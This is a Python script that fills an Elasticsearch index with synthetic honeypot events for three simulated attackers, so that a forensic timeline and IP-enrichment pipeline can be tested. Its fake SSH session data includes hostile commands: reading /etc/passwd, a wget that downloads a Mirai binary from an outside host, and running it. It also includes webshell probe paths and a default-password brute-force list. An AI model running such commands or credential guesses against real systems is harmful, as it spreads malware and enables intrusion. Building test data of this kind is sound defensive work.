"""
Inject a synthetic multi-honeypot attack scenario into Elasticsearch
using known public IPs — to exercise the forensic timeline + enrichment
(GeoIP, AbuseIPDB, Tor/VPN detection) without waiting for real attackers.

Scenarios:
  A) 185.220.101.45  — Tor exit node : full chain (cowrie → dionaea → galah)
  B) 45.227.254.8    — known SSH brute-forcer : cowrie login storm
  C) 193.32.162.157  — SMB worm scanner : dionaea only
"""

import json
import sys
import time
from datetime import datetime, timedelta, timezone

import urllib.request

ES = "http://172.16.1.100:9200"


def _post(doc: dict):
    day = doc["@timestamp"][:10].replace("-", ".")
    index = f"honeypot-logs-{day}"
    req = urllib.request.Request(
        f"{ES}/{index}/_doc",
        data=json.dumps(doc).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=5) as r:
        r.read()


def _ts(base: datetime, offset_ms: int) -> str:
    return (base + timedelta(milliseconds=offset_ms)).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def scenario_a_tor(base: datetime):
    """Tor exit hits Cowrie SSH → Dionaea SMB → Galah HTTP."""
    ip  = "185.220.101.45"
    sid = "tor01x7d39cc4ac"

    # Cowrie: connect → 3 failed logins → success → commands → close
    _post({"@timestamp": _ts(base, 0),     "honeypot.type": "cowrie",
           "event.id": "cowrie.session.connect", "event.action": "session.connect",
           "session.id": sid, "source.ip": ip, "src_port": 54821,
           "destination.ip": "172.18.0.3", "destination.port": 2222,
           "network.transport": "ssh"})
    for i, user in enumerate(["root", "admin", "oracle"]):
        _post({"@timestamp": _ts(base, 1200 + i*800), "honeypot.type": "cowrie",
               "event.id": "cowrie.login.failed", "session.id": sid,
               "source.ip": ip, "user.name": user})
    _post({"@timestamp": _ts(base, 4500), "honeypot.type": "cowrie",
           "event.id": "cowrie.login.success", "session.id": sid,
           "source.ip": ip, "user.name": "root"})
    for i, cmd in enumerate([
        "uname -a",
        "cat /etc/passwd",
        "wget http://45.9.148.108/bins/mirai.x86 -O /tmp/x",
        "chmod +x /tmp/x && /tmp/x",
    ]):
        _post({"@timestamp": _ts(base, 5000 + i*700), "honeypot.type": "cowrie",
               "event.id": "cowrie.command.input", "session.id": sid,
               "source.ip": ip, "cowrie.input": cmd})
    _post({"@timestamp": _ts(base, 9000), "honeypot.type": "cowrie",
           "event.id": "cowrie.session.closed", "session.id": sid,
           "source.ip": ip})

    # Dionaea: SMB scan + exploit attempt
    for i in range(3):
        _post({"@timestamp": _ts(base, 15000 + i*200), "honeypot.type": "dionaea",
               "event.action": "accept", "source.ip": ip,
               "destination.port": "445", "network.transport": "tcp"})
    _post({"@timestamp": _ts(base, 16000), "honeypot.type": "dionaea",
           "event.action": "smb.exploit", "source.ip": ip,
           "destination.port": "445", "network.transport": "tcp"})

    # Galah: path-discovery & webshell attempts
    for i, (m, p) in enumerate([
        ("GET",  "/.env"),
        ("GET",  "/wp-admin/admin-ajax.php"),
        ("POST", "/shell.php"),
    ]):
        _post({"@timestamp": _ts(base, 25000 + i*900), "honeypot.type": "galah",
               "event.action": "http_request", "source.ip": ip,
               "http.request.method": m, "http.request.uri": p,
               "http.request.user_agent": "Mozilla/5.0 (compatible; scanner)",
               "destination.port": "8080",
               "galah.response.source": "llm"})


def scenario_b_bruteforce(base: datetime):
    """Known SSH brute-forcer hammers Cowrie with 12 failed logins."""
    ip  = "45.227.254.8"
    sid = "brute01zzzz"

    _post({"@timestamp": _ts(base, 0), "honeypot.type": "cowrie",
           "event.id": "cowrie.session.connect", "event.action": "session.connect",
           "session.id": sid, "source.ip": ip, "src_port": 33001,
           "destination.ip": "172.18.0.3", "destination.port": 2222,
           "network.transport": "ssh"})
    pairs = [("root","123456"), ("root","root"), ("admin","admin"),
             ("oracle","oracle"), ("user","user"), ("test","test"),
             ("pi","raspberry"), ("ubuntu","ubuntu"), ("git","git"),
             ("mysql","mysql"), ("postgres","postgres"), ("ftp","ftp")]
    for i, (u, _) in enumerate(pairs):
        _post({"@timestamp": _ts(base, 500 + i*300), "honeypot.type": "cowrie",
               "event.id": "cowrie.login.failed", "session.id": sid,
               "source.ip": ip, "user.name": u})
    _post({"@timestamp": _ts(base, 5000), "honeypot.type": "cowrie",
           "event.id": "cowrie.session.closed", "session.id": sid,
           "source.ip": ip})


def scenario_c_smb_worm(base: datetime):
    """SMB worm scanner — Dionaea-only sweep."""
    ip = "193.32.162.157"
    for i in range(5):
        _post({"@timestamp": _ts(base, i*400), "honeypot.type": "dionaea",
               "event.action": "accept", "source.ip": ip,
               "destination.port": "445", "network.transport": "tcp"})
    _post({"@timestamp": _ts(base, 2500), "honeypot.type": "dionaea",
           "event.action": "smb.session_setup", "source.ip": ip,
           "destination.port": "445", "network.transport": "tcp"})


def main():
    now = datetime.now(timezone.utc).replace(microsecond=0)
    print(f"Injecting scenarios at base time {now.isoformat()}")
    scenario_a_tor(now)
    scenario_b_bruteforce(now + timedelta(minutes=2))
    scenario_c_smb_worm(now + timedelta(minutes=4))
    # Force refresh so docs are immediately searchable
    day = now.strftime("%Y.%m.%d")
    urllib.request.urlopen(f"{ES}/honeypot-logs-{day}/_refresh", timeout=5).read()
    print("Done. Run the timeline builder next.")


if __name__ == "__main__":
    main()
